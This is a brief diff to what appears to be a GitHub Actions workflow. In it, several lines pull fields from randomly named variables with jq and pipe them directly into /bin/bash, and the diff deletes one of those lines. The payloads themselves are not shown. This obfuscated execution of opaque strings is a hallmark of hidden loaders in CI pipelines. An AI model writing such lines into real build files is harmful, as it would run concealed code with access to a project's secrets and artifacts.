@@ -27,7 +27,6 @@ jobs:
           echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
           printf '%s' "$wmf45" | jq -r .qtqh17 | /bin/bash
           echo $e48 | jq -r .yrjfk65575 | /bin/bash
-          echo $x26257 | jq -r .r8320 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
